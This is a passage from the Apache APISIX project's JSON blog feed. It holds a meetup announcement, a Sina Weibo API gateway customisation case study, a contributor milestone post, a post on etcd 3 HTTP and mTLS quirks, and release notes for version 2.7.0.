2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.045,"truncated":true,"authors":[{"name":"APISIX"}],"prevItem":{"title":"ApacheCon Asia 2021: Apache APISIX Technical Topics","permalink":"/blog/2021/07/25/apachecon-asia"},"nextItem":{"title":"The Road to Customized Development of Sina Weibo API Gateway","permalink":"/blog/2021/07/06/the-road-to-customization-of-sina-weibo-api-gateway-based-on-apache-apisix"}},"content":"> On Friday, July 23rd, 2021 at 00:00 GMT, Apache APISIX committer Jintao Zhang will share the topic \\"Run Apache APISIX in Kubernetes\\" at the Data on Kubernetes Community Meetup for developers around the world.\\n\\n\x3c!--truncate--\x3e\\n\\nIn this talk, Jintao Zhang will share his experience of running Apache APISIX on Kubernetes and how to use Apache APISIX as an Ingress Controller. If you\'re interested, don\'t miss it, sign up now!\\n\\n## How to participate\\n\\n- Method 1: Click [here](https://www.meetup.com/Data-on-Kubernetes-community/events/278922486/) to visit the registration page and register.\\n\\n- Way 2: Go to the Zoom link at the beginning of the live broadcast to listen to the sharing: [Meeting Room Live](https://zoom.us/webinar/tJYofuChrzktGtI3wr8SZHACRnNkxr5cWgny).\\n\\n## What to do if you can\'t make it to the live stream\\n\\nAfter the Meetup, we will upload the Meetup recording on Apache APISIX\'s bilibili account. Welcome to follow the Apache APISIX bilibili account [Apache-APISIX](https://space.bilibili.com/551921247).\\n\\n## Lecturer Introduction\\n\\nJintao Zhang is a cloud native technologist at Tributary Technology, Apache APISIX committer, Kubernetes ingress-nginx reviewer, and contributor to many open source projects such as containerd/Docker/Helm/Kubernetes/KIND. He is also active in the open source community as a contributor, and is one of the maintainers of the K8S Weekly Eco Report.\\nWith 7 years in the industry, Jintao Zhang has a lot of practice and deep source code research on containerization technologies such as Docker and Kubernetes, and is one of the core organizers of PyCon China. He is also the author of \\"Kubernetes Hands-on\\" and \\"Docker Core Knowledge Must Know\\". He runs the public number: MoeLove.\\n\\nHe is also the author of Kubernetes Hands-on and Docker Core Knowledge.\\n![Lecturer-Jintao Zhang](https://static.apiseven.com/202108/1630382172445-cf20986b-c939-497e-86a4-92da7064ae97.PNG)\\n\\n## About Apache APISIX\\n\\nApache APISIX is a dynamic, real-time, high-performance open source API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service fusion, authentication, observability, etc. Apache APISIX can help enterprises quickly and securely handle API and microservice traffic, including gateways, Kubernetes Ingress and Service Grid.\\n\\nApache APISIX has been used by hundreds of enterprises worldwide to handle business-critical traffic, including finance, Internet, manufacturing, retail, carriers, and more, such as NASA, the European Union\'s Digital Factory, China Airlines, China Mobile, Tencent, Huawei, Weibo, NetEase, Shell, 360, Taikang, and Nespresso Tea.\\n\\nMore than 200 contributors have come together to create Apache APISIX, the world\'s most active open source gateway project. Smart developers! Come join this active and diverse community and come together to bring more good things to the world!\\n\\n[Apache APISIX GitHub project](https://github.com/apache/apisix)"},{"id":"2021/07/06/the-road-to-customization-of-sina-weibo-api-gateway-based-on-apache-apisix","metadata":{"permalink":"/blog/2021/07/06/the-road-to-customization-of-sina-weibo-api-gateway-based-on-apache-apisix","source":"@site/blog/2021/07/14/the-road-to-customization-of-Sina-Weibo-API-gateway-based-on-Apache-APISIX.md","title":"The Road to Customized Development of Sina Weibo API Gateway","description":"This article analyzes the pain points of NGINX Sina Weibo when using NGINX, and why the cloud-native API gateway Apache APISIX was chosen as the company\'s API gateway.","date":"2021-07-14T00:00:00.000Z","formattedDate":"July 14, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":12.42,"truncated":true,"authors":[{"name":"Yong Nie"}],"prevItem":{"title":"Live | Apache APISIX x Kubernetes","permalink":"/blog/2021/07/21/apache-apisix-kubernetes"},"nextItem":{"title":"Apache APISIX has over 200 contributors in GitHub main repo! ","permalink":"/blog/2021/07/06/celebrate-200-contributors"}},"content":"> Sina Weibo\u2019s previous HTTP API gateway was built based on Nginx, which brought up a series of problems. After some research, we chose Apache APISIX, which is dynamic, efficient and stable to meet the fast response requirements of the business.\\n\\n\x3c!--truncate--\x3e\\n\\nSina Weibo\u2019s previous HTTP API gateway was built based on Nginx, and all routing rules were stored in Nginx configuration files, which brought a series of problems: long upgrade steps, inflexibility and difficulty in troubleshooting problems when adding, deleting, changing or tracking services. After some research, we chose the closest expected, cloud-based micro-service API gateway: Apache APISIX, which is dynamic, efficient and stable to meet the rapid response requirements of the business.\\n\\n## Background Information\\n\\nIn Sina Weibo, if an operation engineer wants to create an API service, he/she needs to write it in the Nginx configuration file first, submit it to the git code repository, and wait for other operation engineer responsible for the online checkout to confirm the success of the audit before they can push the deployment to the line, and then brutally notify Nginx to reload it, and only then is the service change successful.\\n\\nThe whole process is long and inefficient, and cannot meet the trend of low-code DevOps operation and maintenance. Therefore, we expect to have a management backend portal, where operation engineer can operate all the http api routing and other configurations in the UI interface.\\n\\n![Sina Weibo Publish Process](https://user-images.githubusercontent.com/23514812/125594900-d4c01fb7-3af4-4e8c-8779-f3f16b7f0bca.png)\\n\\nAfter some research, we chose the closest to the expected cloud-based micro-services API gateway: Apache APISIX.\\n\\n1. Based on Nginx, the technology stack is unified before and after the canary release upgrade, security, stability, etc. are guaranteed.\\n1. Built-in unified control surface, unified management of multiple proxy services.\\n1. Dynamic API call, you can complete the common resource modifications in real time, compared to the traditional Nginx configuration + reload way progress is obvious.\\n1. Rich routing options to meet the needs of Sina Weibo routing.\\n1. Good scalability, support Consul kv.\\n1. Good performance.\\n\\n![Apache APISIX Architecture](https://user-images.githubusercontent.com/23514812/125596483-aee21ac7-a902-4e44-abc4-8bfda4f51f82.png)\\n\\n## Why Did We Choose Custom Development?\\n\\nIn the actual business situation, we cannot use Apache APISIX directly for the following reasons.\\n\\n1. Apache APISIX does not support SaaS multi-tenancy, and there are many upper-layer applications that actually need to be operated and maintained, and each business line development or operation and maintenance student only needs to manage and maintain their own rules, upstreams and other rules, which are not associated with each other.\\n1. When the routing rules are published online, they need fast roll back support if problems arise.\\n1. When creating or editing existing routing rules, we are not so sure about publishing them directly to the wire, and then we need it to be able to support canary release to a specified gateway instance for simulation or local testing.\\n1. The need for API gateways to be able to support Consul KV-style service registration and discovery mechanisms.\\n\\nNone of these requirements are currently supported built-in by Apache APISIX, so custom development is the only way to make Apache APISIX truly usable within Weibo.\\n\\n## What Did We Change in the Control Plane of Apache\xa0APISIX?\\n\\nFor our custom development, we used Apache APISIX version 1.5, and Apache APISIX Dashboard compatible with Apache APISIX version 1.5.\\n\\nThe goal of custom development is simple and clear, that is, completely zero code, UI, all seven layers of HTTP API service creation, editing, updating, up and down and all other actions must be done on the Dashboard. Therefore, in the actual environment, we forbid development and operation and operation engineer to call APISIX Admin API directly. If we skip the Dashboard and call APISIX Admin API directly, it will lead to the gateway operation not being audited at the UI level, so we cannot take the workflow, and naturally, there is not much security to speak of.\\n\\nThere is a slightly special case, operations and maintenance need to call the API to complete the bulk import of services, you can call the H5 Dashboard API to complete, so as to comply with the unified workflow.\\n\\n### Support Saas-based Services\\n\\nA complete database of product lines and business lines is available at the enterprise level, and each specific product line and business line can be represented by a saas_id value. Then, before creating the gateway configuration data for insertion into the ETCD, a saas_id value is plugged in and all the data has a SaaS attribution in terms of logical attributes.\\n\\nUsers, roles and the actual product line of operation are then associated with the following correspondence.\\n\\n![Users, roles and product association](https://static.apiseven.com/202108/1646899698131-8e90270e-9849-435e-b776-0827c04b293c.png)\\n\\nA user can be assigned to undertake different operations and maintenance roles to manage and maintain different product lines of services.\\n\\nThe administrator role is very easy to understand, the core role of operation and maintenance services, for service addition / deletion / update / check; in addition, we have the concept of read-only users, read-only users are generally used to view the service configuration, view the workflow, debugging and so on.\\n\\n### Add Audit Function\\n\\n![Audit Function1](https://static.apiseven.com/202108/1646899698135-0b92ed91-0803-4f2c-8d4b-6873c19fa492.png)\\n\\nIn the open source version, a route can be published directly after it is created or modified.\\n\\nIn our custom version, after a route is created or modified, it needs to go through an audit workflow before it can be published, which lengthens the process, but we think it is more credible to publish after the authorization is reviewed at the enterprise level.\\n\\n![Audit Function2](https://static.apiseven.com/202108/1646900059586-f7feca14-57ed-417b-aadc-ca02e31bfa47.png)\\n\\nWhen creating routing rules, they must be reviewed by default. To take into account efficiency, when entering new services, you can choose the no-review, fast-publishing channel and click the publish button directly.\\n\\n![Audit Function3](https://static.apiseven.com/202108/1646900090210-6f08f1e5-fc62-4148-9d5a-879bc96a54d2.png)\\n\\nWhen an important API route has problems after a certain adjustment rule release goes live, you can select the previous version of the routing rule for a quick roll back, with the granularity of a single route roll back that will not affect other routing rules.\\n\\nThe internal processing flow of a single route roll back is shown in the following figure.\\n\\n![Audit Function4](https://static.apiseven.com/202108/1646900126327-f297be1b-c7e5-4991-9fea-0e1e87bea937.png)\\n\\nWe need to create version database storage for each release of a single route. This way, when we do a full release after the audit, each release will generate a version number and the corresponding full configuration data; then the version list grows. When we need to roll back, go to the version list and select a corresponding version to rollback; in a sense, the roll back is actually a special form of full release.\\n\\n### Support Canary Release\\n\\nOur custom-developed canary release feature is different from what the community generally understands as canary release, and is less risky compared to full deployment. When a change to a routing rule is large, we can choose to publish and take effect only on a specific limited number of gateway instances, instead of publishing and taking effect on all gateway instances, thus reducing the scope of the release, lowering the risk, and enabling fast trial and error.\\n\\nAlthough canary release is a low-frequency behavior, there is still a state transition between it and full volume release.\\n\\n![Support Canary Release1](https://static.apiseven.com/202108/1646900161267-83d3bb57-596c-4e23-8fa3-4999739a77ca.png)\\n\\nWhen the percentage of canary release decreases to 0%, it is the state of full release; when the canary release rises to 100%, it is the next full release, and this is its state transition.\\nThe full canary release feature requires some API support exposed on the gateway instance in addition to the administrative backend support.\\n\\n![Support Canary Release2](https://static.apiseven.com/202108/1646900188100-bf697358-4d6a-44d7-ab3d-223728e860b2.png)\\n\\nThe above screenshot shows the screenshot when operating canary release to select a specific gateway instance.\\n\\nThe full canary release feature requires some API support exposed on the gateway instance in addition to the administrative backend support.\\n\\n![Support Canary Release3](https://static.apiseven.com/202108/1646900211377-0c1df098-c5be-4c69-bda6-eabd1518f0f5.png)\\n\\nCanary release API fixed URI, the unified path is /admin/services/gray/{SAAS_ID}/ routes. Different HTTP Method presents different business meanings, POST means create, DELETE means to stop canary release, GET means to view.\\n\\n#### Activation Process\\n\\n![Activation Process](https://static.apiseven.com/202108/1646900248884-ca1757d7-e6c0-45a3-a677-d29184b494d8.png)\\n\\nAn API is published from the gateway level, and after receiving the data the worker process checks the legitimacy of the data sent, and the legitimate data is broadcast to all worker processes via events. Then the canary release API is called and the canary release rules are added and take effect when the next request is processed.\\n\\n#### Deactivation Process\\n\\n![Deactivation Process](https://static.apiseven.com/202108/1646900280677-87a90d54-c78d-4660-afab-33bbc433010d.png)\\n\\nThe deactivation process is basically the same as the canary release distribution process. The API for canary release distribution is called by the DELETE method and broadcasted to all work processes. If it exists in the route table, delete it and try to restore it from the ETCD. If the canary release is deactivated, make sure that the original ETCD can be restored without affecting the normal service.\\n\\n### Support Fast\xa0Import\\n\\nIn addition to supporting the creation of routes on the management page, many operation engineer are still more accustomed to using scripts to import. We have a large number of HTTP API services, and it would be very time-consuming to manually enter them one by one. If you import through scripts, you can reduce a lot of service migration resistance.\\n\\nBy exposing the Go Import HTTP API for the management backend, the operation engineer can fill in the assigned token, SaaS ID and related UIDs in the ready-made Bash Script file to import the services into the management backend more quickly. The subsequent operation of importing services still needs to be done in the management backend H5 interface.\\n\\n![Fast\xa0Import](https://user-images.githubusercontent.com/23514812/125597641-54bf1649-0238-4973-8501-48c1cead328e.png)\\n\\n## What Did We Change in the Data Plane of Apache\xa0APISIX?\\n\\nCustom development based on the Apache APISIX data surface requires a number of code path rules to be followed. In particular, the code for the Apache APISIX gateway and the custom code are stored in separate paths, and the two work together and can each be iterated independently.\\n\\n![Changes in the Data Plane](https://static.apiseven.com/202108/1646900844425-46711779-fa2c-4242-a3c4-311fd5ea2563.png)\\n\\n### Modification of Installation Package\\n\\nSo when packaging, not only custom code, but also dependencies, configuration, etc. all need to be packaged together for distribution. As for the output format, you can either choose Docker or type it into a tarball, as required.\\n\\n![Modification of Installation Package](https://static.apiseven.com/202108/1646900306141-5f85e7e9-3e13-4477-957c-657d5435bdef.png)\\n\\n### Custom Development of\xa0Code\\n\\nSome custom modules need to be loaded first when they are initialized, so that the code intrusion into Apache APISIX becomes minimal, requiring only modifications to the Nginx.conf file.\\n\\n![Custom Development of\xa0Code1](https://static.apiseven.com/202108/1646900356726-16c7b794-c5d9-43a4-af60-7dc675f56dc7.png)\\n\\nFor example, if you need to stuff an upstream object with a saas_id attribute field, you can call the following method at initialize time.\\n\\n![Custom Development of\xa0Code2](https://static.apiseven.com/202108/1646900387986-d7036503-98a9-4cb8-a47e-27e7ae83796b.png)\\n\\nYou need to be called in the initworker_by_lua* phase to complete the initialization for similar modifications.\\n\\nAnother scenario: how to directly rewrite the implementation of a currently existing module. For example, if you have a debug module and now you need to refactor its initialization logic, i.e. rewrite the init_worker function.\\n\\n![Custom Development of\xa0Code3](https://user-images.githubusercontent.com/23514812/125598066-fd0da722-7fb0-44a2-99cd-15bf07fd1ad6.png)\\n\\nThe advantage of this approach is that it not only keeps the original physical API files intact, but also adds custom API-specific logic rewrites, thus reducing the cost of later code management and bringing great convenience for subsequent upgrades.\\n\\nIf you have similar needs in a production environment, you can refer to the above approach.\\n\\n### Support Consul\xa0KV\\n\\nCurrently, most of Weibo services use Consul KV as a service registration and discovery mechanism. Previously, Apache APISIX did not support the Consul KV method of service discovery mechanism, so a `consul_kv.lua` module needs to be added to the gateway layer, and a UI interface needs to be provided in the management backend as follows.\\n\\n![Support Consul\xa0KV1](https://static.apiseven.com/202108/1646900423967-5b5db4c1-1c2c-495c-88ef-e0f4937bcef8.png)\\n\\nIn the upstream list in the console, everything is filled in at a glance, and the metadata of all registered nodes is automatically presented when the mouse is moved over the registered service address, which greatly facilitates the daily operation of our operation engineers.\\n\\n![Support Consul\xa0KV2](https://static.apiseven.com/202108/1646900450031-bf0109c1-c859-4fbd-9a47-967c193d27ff.png)\\n\\nThe `consul_kv.lua` module is relatively simple to configure at the gateway level, supporting multiple connections to different Consul clusters at the same time, but this is also due to the requirements of the actual environment.\\n\\n![Support Consul\xa0KV3](https://static.apiseven.com/202108/1646900471956-9490a2d0-256d-4f15-b24e-6f8204a60a17.png)\\n\\nThis code has now been merged into the APISIX master branch and is included in version 2.4.\\n\\nThe module\'s process model uses a subscription publishing model, where each gateway instance has one and only one process that polls multiple Consul service clusters with long connections and broadcasts new data to all business sub-processes as it becomes available.\\n\\n## Problems Encountered during Customization\\n\\n### High Costs for Migration\\n\\nAt the operation and maintenance level, we are actually facing a problem of migration cost.\\n\\nAny new thing appeared, used to replace the existing foundation, will not be a smooth ride, but need to go through a period of time slowly familiar with, improve knowledge, and then keep trial and error, slowly move forward, and gradually eliminate all kinds of doubts in our minds. Only after a period of stable operation and various problems have been solved, will the next step of more rapid replacement phase be entered. There is no doubt that the use of APISIX in Weibo is still in the stage of gradual advancement, and we are still familiarizing ourselves with it, learning it, and gaining a deeper understanding of it, while solving various migration problems in order to find the best practice path.\\n\\nFor example, during the migration process, you need to import various upstream and routing rules from the Nginx.conf file into the gateway system administration backend one by one, which is a very tedious and manual process.\\n\\n![High Costs for Migration](https://user-images.githubusercontent.com/23514812/125598279-1fa93710-e5a0-4dc4-b42b-46b02f66f6a8.png)\\n\\nAt the same time, we will also encounter Nginx various complex variable judgment statements, at present, we mainly find one to solve one, and continue to accumulate experience.\\n\\n### High Costs for\xa0Upgrades\\n\\nHigh level of customization, resulting in higher costs for subsequent upgrades. We are currently experiencing the same problem as everyone else, many people should be based on version 1.x Apache APISIX how to upgrade to 2.0, we also have a Dashboard of private custom development, the subsequent upgrade costs should be higher.\\n\\n### Feeding the Community\\n\\nThe final part is about the Apache APISIX community. We have been thinking about how to feed features of interest to the Apache APISIX community for everyone to use and modify together.\\n\\nIt is an objective fact that our custom development is driven primarily by actual internal Weibo requirements, and there is some variation from the evolution driven by the Apache APISIX community. However, excluding code that contains sensitive data, there are always common needs at the code level for more general functionality that the enterprise and open source communities can push together to make more stable and mature. For example, a common Consul KV service discovery module, handling of some highly available profiles, and fixes for other issues.\\n\\nThese common requirements are typically polished internally for a period of time until they fully satisfy internal requirements, and then gradually submitted to the community open source branch, but this also requires a process."},{"id":"Apache APISIX has over 200 contributors in GitHub main repo! ","metadata":{"permalink":"/blog/2021/07/06/celebrate-200-contributors","source":"@site/blog/2021/07/06/celebrate-200-contributors.md","title":"Apache APISIX has over 200 contributors in GitHub main repo! ","description":"Apache APISIX has over 200 contributors in GitHub main repo!","date":"2021-07-06T00:00:00.000Z","formattedDate":"July 6, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.57,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"The Road to Customized Development of Sina Weibo API Gateway","permalink":"/blog/2021/07/06/the-road-to-customization-of-sina-weibo-api-gateway-based-on-apache-apisix"},"nextItem":{"title":"Does etcd 3 Support HTTP Access Perfectly?","permalink":"/blog/2021/06/30/etcd3-support-http-access-perfectly"}},"content":"> Apache APISIX has over 200 contributors in GitHub main repo!\\n\\n\x3c!--truncate--\x3e\\n\\nBefore entering the Apache incubator, Apache APISIX had only more than 20 contributors. Today, there are more than 200 contributors to the main Apache APISIX repo. 200 contributors have submitted a total of 2386 PRs, making it the most active open source gateway project in the world.\\n\\nIn August 2019, Apache APISIX released the first version 0.6.0. Version 1.0 was released in January 2020, which was the first production version of Apache APISIX. We maintain a fast and stable pace, releasing a new version every month. Such rapid iteration is inseparable from the support of every contributor in the community. Thanks to the community contributors for your contributions in all aspects of code, documentation, and maintenance!\\n\\n![poster](https://user-images.githubusercontent.com/23514812/124587288-096e2a80-de8a-11eb-94b3-95b5932c0093.jpg)\\n\\nThe goal of Apache APISIX is not just to be an API gateway. Apache APISIX hopes to be the fourth and seventh layer of traffic processing and connection in the cloud-native era. All configurations in Apache APISIX are dynamic, which is very important for elastic scaling and multi-cloud deployment in the cloud-native era.\\nWelcome to join the Apache APISIX community, welcome to use Apache APISIX!\\n\\n## Contributors Say\\n\\nWhen reaching 200 contributors, the contributors in the community sent their blessings to Apache APISIX. Here are what they want to say to Apache APISIX.\\n\\n[juzhiyuan](https://github.com/juzhiyuan): The Apache APISIX open source community is extremely active, and the monthly release rhythm always brings new features that are hotly discussed in the community. Bless Apache APISIX, and hope that more contributors will participate, learn the spirit of open source, and participate in open source projects.\\n\\n[Serendipity96](https://github.com/Serendipity96): The project construction is very friendly to novices. A good first issue is set up. Although I know little about  code, I can also participate in it. I am able to modify some documentation issues. The community deals  issues and pr very quickly.\\n\\n[Yiyiyimu](https://github.com/Yiyiyimu): From the total ignorance before the Open Source Promotion Plan, to the surprise of nominating as committer at the end of the event, thank you Apache APISIX for showing me the brilliance of the open source community. As the 104th contributor, congratulations to Apache APISIX for reaching 200 contributors!\\n\\n[tokers](https://github.com/tokers): Since open source of Apache APISIX in 2019, both software quality and community building have become more and more complete and healthy in just two years. It has become the most popular open source API gateway project, as a part of the community. I can clearly feel everyone\'s enthusiasm for Apache APISIX, which is also a major driving force for the continuous improvement of this software. I hope that in the future, Apache APISIX can become more mature and easy to use.\\n\\n[iamayushdas](https://github.com/iamayushdas):Kudos to Apache APISIX for completing 200 contributors \ud83e\udd73 It\'s a very auspicious moment for me on being the part of such an amazing organisation \u201cApache APISIX \\". This increased number of contributors not only show how much useful the project is but also it is possible because of supporting developers who not only helps experienced contributors but also newbies who are even new to the OpenSource culture,OpenSource culture is truly and honestly followed by Apache APISIX. If you are new to OpenSource and trust me you will never regret and also this could be the best decision of your path towards an OpenSource developer and contributor.\\n\\n[tao12345666333](https://github.com/tao12345666333): Apache APISIX has a very active and friendly community. Whether it is an issue or a PR, you will get detailed feedback and the experience is very good. I wish the Apache APISIX community is getting bigger and bigger, with more and more functions, and 666 together.\\ncommunity activity\\n\\n## Join the Apache APISIX community\\n\\nSincerely invite you to join the Apache APISIX open source community, let us work together to create the best API gateway in the cloud-native era!\\n\\nThere is no barrier to becoming an Apache APISIX contributor. In the Apache APISIX community, it not only includes code contributions, but also documentation, testing, design, and video production. Posting pr or issue on Github, sharing cases through live broadcast, helping you solve problems in exchange groups, and participating in offline Meetup are all ways to participate in the community.Participating communities can also get exclusive peripherals of Apache APISIX, cool T-shirts, stickers, etc.\\n\\n![img](https://user-images.githubusercontent.com/23514812/124587334-1723b000-de8a-11eb-8a8f-c10dfd9aa0a2.png)\\n\\nLooks forward to your joining!"},{"id":"2021/06/30/etcd3-support-http-access-perfectly","metadata":{"permalink":"/blog/2021/06/30/etcd3-support-http-access-perfectly","source":"@site/blog/2021/06/30/etcd3-support-HTTP-access-perfectly.md","title":"Does etcd 3 Support HTTP Access Perfectly?","description":"It has been 8 months since the release of Apache APISIX version 2.0 last October. In the course of practice, we have also discovered some issues with etcd\'s HTTP API that interoperate with the gRPC API. In fact, having a gRPC-gateway does not mean that HTTP access is perfectly supported, there are some nuances here.","date":"2021-06-30T00:00:00.000Z","formattedDate":"June 30, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.005,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Apache APISIX has over 200 contributors in GitHub main repo! ","permalink":"/blog/2021/07/06/celebrate-200-contributors"},"nextItem":{"title":"Release Apache APISIX 2.7.0","permalink":"/blog/2021/06/29/release-apache-apisix-2.7"}},"content":"> It has been 8 months since the release of Apache APISIX version 2.0 last October. In the course of practice, we have also discovered some issues with etcd\'s HTTP API that interoperate with the gRPC API. In fact, having a gRPC-gateway does not mean that HTTP access is perfectly supported, there are some nuances here.\\n\\n\x3c!--truncate--\x3e\\n\\nAfter etcd was upgraded to version 3.x, the protocol of its external API was switched from normal HTTP1 to gRPC. etcd proxied HTTP1 requests through gRPC-gateway to access the new gRPC API in the form of gRPC for those special groups that cannot use gRPC. (Since HTTP1 is too awkward to pronounce, the following is simplified to HTTP, which corresponds to gRPC. Please don\u2019t get hung up on the fact that gRPC is also an HTTP request.)\\n\\nWhen Apache APISIX started using etcd, we used the etcd v2 API, and since Apache APISIX version 2.0, we have upgraded our dependency on etcd to 3.x. Since there is no gRPC library in the Lua ecosystem, etcd\u2019s HTTP compatibility has helped us a lot, so we don\u2019t have to go through a lot of effort to patch This was a big help, so we didn\u2019t have to go to a lot of trouble to fill in the gaps.\\n\\nIt has been 8 months since the release of Apache APISIX version 2.0 last October. In the course of practice, we have also discovered some issues with etcd\u2019s HTTP API that interoperates with the gRPC API. In fact, having a gRPC-gateway does not mean that HTTP access is perfectly supported, there are some nuances here.\\n\\n## Breaking the Default Restrictions of gRPC\\n\\nJust a few days ago, etcd released version v3.5.0. This release solves a problem that has been bothering us for a long time.\\n\\nUnlike HTTP, gRPC limits the size of data that can be read in one request by default. This limit is called \u201cMaxCallRecvMsgSize\u201d and defaults to 4MiB. When Apache APISIX fully synchronizes etcd data, this limit can be triggered if configured enough and the error \u201cgrpc: received message larger than max\u201d.\\n\\nMiraculously, if you use etcdctl to access it, there is no problem at all. This is because this limit can be set dynamically when establishing a connection with the gRPC server. etcdctl sets this limit to a large integer, which is equivalent to removing this limit.\\n\\nSince many users have encountered the same problem, we have discussed countermeasures.\\nOne idea was to use incremental synchronization to simulate full synchronization, which has two drawbacks.\\n\\n1. It is complicated to implement and requires a lot of code changes.\\n2. It would extend the time required for synchronization.\\n\\nAnother idea is to modify etcd. If you can remove the restrictions in etcdctl, why not treat gRPC-gateway the same way? The same change can be made to gRPC-gateway.\\nWe\u2019ve adopted the second option, and have given etcd a PR: [PR #13077](https://github.com/etcd-io/etcd/pull/13077).\\n\\n![2021-06-30-1](https://static.apiseven.com/202108/1639465584634-26435c89-3e1c-4fb9-b094-057fce0f769d.png)\\n\\nThe latest release of v3.5.0 includes this change that we contributed. If you encounter \u201cgrpc: received message larger than max\u201d, you may want to try this version. This change has also been back-ported to the 3.4 branch by the etcd developers, and the next release of the 3.4 branch will carry this change as well.\\n\\nThis incident also shows that gRPC-gateway is not foolproof. Even with it, there is no guarantee that HTTP access will have the same experience as gRPC access.\\n\\n## Interesting Usage of Server-side Certificates\\n\\nAfter Apache APISIX added support for etcd mTLS, some users reported that they have been unable to complete the checksum, while accessing with etcdctl was successful. After talking to the user, I decided to take his certificate and reproduce it.\\n\\nDuring the replication process, I noticed this error in the etcd log:\\n\\n``` text\\n2021-06-09 11:10:13.022735 I | embed: rejected connection from \\"127.0.0.1:50898\\" (error \\"tls: failed to verify client\'s certificate: x509: certificate specifies an incompatible key usage\\", ServerName \\"\\")\\nWARNING: 2021/06/09 11:10:13 grpc: addrConn.createTransport failed to connect to {127.0.0.1:12379 0 }. Err :connection error: desc = \\"transport: authentication handshake failed: remote error: tls: bad certificate\\". Reconnecting...\\n```\\n\\nThe \u201cbad certificate\u201d error message looks at first glance like it is because we sent the wrong client certificate to etcd. But if you look closely, you will see that this error is reported inside the gRPC server.\\n\\nThe gRPC-gateway acts as a proxy inside etcd, turning outside HTTP requests into gRPC requests that the gRPC server can handle.\\n\\nThe general architecture is as follows:\\n\\n```text\\netcdctl ----\x3e gRPC server\\nApache APISIX ---\x3e gRPC-gateway ---\x3e gRPC server\\n```\\n\\nWhy does etcdctl connect directly to the gRPC server, but not with a gRPC-gateway in between?\\n\\nIt turns out that when etcd enables client-side certificate validation, a client-side certificate is required to connect to the gRPC server using the gRPC-gateway. Guess where this certificate comes from?\\n\\netcd uses the configured server-side certificate directly as the client-side certificate here.\\n\\nA certificate that provides both authentication on the server side and identity on the client side doesn\u2019t seem to be a problem. Unless server auth expansion is enabled on the certificate, but client auth is not enabled. Execute the following command on the faulty certificate:\\n\\n```shell\\nopenssl x509 -text -noout -in /tmp/bad.crt\\n```\\n\\nYou will see output like this:\\n\\n```text\\nX509v3 extensions:\\nX509v3 Key Usage: critical\\nDigital Signature, Key Encipherment\\nX509v3 Extended Key Usage:\\nTLS Web Server Authentication\\n```\\n\\nNote the \u201cTLS Web Server Authentication\u201d here, if we change it to \u201cTLS Web Server Authentication, TLS Web Client Authentication\u201d or without this extension, there will be no problem.\\n\\nThere is also an issue about this problem on etcd\u2019s repository: Issue [#9785](https://github.com/etcd-io/etcd/issues/9785\\n).\\n\\n![2021-06-30-2](https://static.apiseven.com/202108/1639465662863-30bc4fa9-8b7c-47d9-a73e-810bd690a588.png)\\n\\n## Summary\\n\\nAlthough we have listed a few minor issues above, etcd\u2019s support for HTTP access is still a very useful feature.\\n\\nThanks to the users of Apache APISIX, we have a large user base to find these details of etcd. As a large user of etcd, we will continue to communicate with the etcd developers for many years to come."},{"id":"Release Apache APISIX 2.7.0","metadata":{"permalink":"/blog/2021/06/29/release-apache-apisix-2.7","source":"@site/blog/2021/06/29/release-apache-apisix-2.7.md","title":"Release Apache APISIX 2.7.0","description":"Apache APISIX 2.7.0 has been released! Welcome to download and use it.","date":"2021-06-29T00:00:00.000Z","formattedDate":"June 29, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.4,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"Does etcd 3 Support HTTP Access Perfectly?","permalink":"/blog/2021/06/30/etcd3-support-http-access-perfectly"},"nextItem":{"title":"Why would you choose Apache APISIX instead of NGINX or Kong?","permalink":"/blog/2021/06/28/why-we-need-apache-apisix"}},"content":"> Apache APISIX 2.7.0 has been released! Welcome to download and use it.\\n\\n\x3c!--truncate--\x3e\\n\\nThis version supports multi-language plugins, enhances the four-layer TCP proxy and Nginx configuration. More than 20 developers participated, and 70 plus pull requests have been submitted. The following is an introduction to the key features.\\n\\n## Release Notes\\n\\n### Multi-language plugin\\n\\nWith the release of the first version of apisix-java-plugin-runner, and apisix-go-plugin-runner completes its main functions, the multi-language plugin of Apache APISIX supports the two most widely used back-end programming languages. If you are still worried that the development of Apache APISIX plugin will be limited to Lua ecosystem, please try our multi-language plugin runner to develop Java / Go plugins.\\n\\n### Enhanced four-layer TCP proxy\\n\\nIn version 2.7, we have developed new features of TCP proxy, including:\\n\\n- Allow domain name configuration in upstream\\n- Allow mqtt-proxy plugin to configure domain name\\n- Support for receiving TLS over TCP connections, the certificate of which can be dynamically configured just like HTTPS certificate\\n- SNI-based route rules\\n- Dynamic verification of client certificates\\n\\nIn future releases, we will continue to improve TCP proxy, so stay tuned!\\n\\n### Enhanced Nginx configuration\\n\\nWe hope to dynamically set more and more Nginx configurations, so we add our own patches and Nginx C modules to enhance the native Nginx.\\n\\nThe following new features are currently included:\\n\\n- Dynamically set mTLS\\n- Dynamically set client_max_body_size\\n\\nIn future releases, we will continue to allow the following Nginx configurations to be set dynamically:\\n\\n- upstream keepalive\\n- gzip\\n- real_ip\\n- proxy_max_temp_file_size\\n\\n## Download\\n\\nDownload Apache APISIX 2.7.0-Release\\n\\n- Source code: please visit [download page](https://apisix.apache.org/downloads/)\\n- Binary installation package: please visit [Installation Guide](https://apisix.apache.org/zh/docs/apisix/how-to-build/)"},{"id":"2021/06/28/why-we-need-apache-apisix","metadata":{"permalink":"/blog/2021/06/28/why-we-need-apache-apisix","source":"@site/blog/2021/06/28/why-we-need-Apache-APISIX.md","title":"Why would you choose Apache APISIX instead of NGINX or Kong?","description":"Many companies used to use NGINX or Kong as their API gateway but switched to Apache APISIX now. As an Open Source API Gateway, Apache APISIX solves a lot of pain points for 